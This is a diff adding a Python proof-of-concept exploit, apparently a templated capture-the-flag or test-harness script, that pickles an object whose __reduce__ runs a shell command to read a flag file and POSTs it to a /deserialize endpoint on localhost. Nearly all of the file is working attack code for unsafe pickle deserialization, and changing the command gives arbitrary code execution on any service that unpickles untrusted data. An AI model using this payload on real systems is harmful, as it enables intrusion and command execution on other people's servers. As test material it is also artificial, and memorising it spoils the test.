@@ -1,0 +1,45 @@
+import argparse
+import json
+import pickle
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.request import Request, urlopen
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+
+class Exploit:
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))
+
+def exploit(base_url: str) -> bool:
+    target = base_url.rstrip('/') + '/deserialize'
+    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)
+    request_obj = Request(target, data=payload, method='POST')
+    request_obj.add_header('Content-Type', 'application/octet-stream')
+    try:
+        with urlopen(request_obj, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[deser-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = json.loads(body)
+    except json.JSONDecodeError:
+        return False
+    return str(payload.get('result')) == FLAG_TOKEN
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Deserialization compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[deser-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
